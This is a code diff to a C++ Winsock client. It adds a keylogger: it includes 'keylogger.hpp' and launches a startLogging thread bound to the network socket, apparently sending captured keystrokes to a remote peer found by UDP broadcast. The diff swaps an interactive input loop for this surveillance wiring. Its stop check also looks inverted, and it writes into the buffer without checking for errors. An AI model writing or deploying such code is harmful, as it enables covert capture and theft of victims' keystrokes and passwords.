@@ -3,14 +3,17 @@
 #include <string>
 #include <cstring>
 #include <sys/types.h>
-// #include <thread>
+#include <thread>
 #include <vector>
+#include <atomic>
+
 #ifdef _WIN32
 #include <winsock2.h>
 #include <Windows.h>
 #include <winuser.h>
 #include <ws2tcpip.h>
 #endif
+#include "keylogger.hpp"
 #define PORT 50000
 #define BROADCAST_IP "255.255.255.255"
 void startup(){
@@ -142,13 +145,35 @@ int main(int argc, char **argv) {
         std::cout << "response received: " << buffer << std::endl;
     } else{
 
-        while(true){
-            std::string input;
-            std::getline(std::cin,input);
-            if(input=="terminate")break;
+        // while(true){
+        //     std::string input;
+        //     std::getline(std::cin,input);
+        //     if(input=="terminate")break;
+        //
+        //     send(clientFD,input.c_str(),input.size(),0);
+        // }
+         std::atomic<bool> running(true);
+        
+         std::thread keylogger_thread(startLogging,clientFD, std::ref(running));
 
-            send(clientFD,input.c_str(),input.size(),0);
-        }
+        // Simulate the client doing other work
+         while(true){
+         int n = recvfrom(clientFD, buffer, sizeof(buffer), 0, (struct sockaddr *)&recvAddr, &addrLen);
+         buffer[n] = '\0';
+         // When ready to stop the keylogger
+         const char* terminateMessage = "TERMINATE";
+             if(strncmp(buffer,terminateMessage,strlen(terminateMessage)) !=0){
+                 running = false;
+        
+                 if (keylogger_thread.joinable()) {
+                     keylogger_thread.join();
+                 }
+                 break;
+             }
+        
+        
+        
+         }
     }
     closesocket(clientFD);
     WSACleanup();
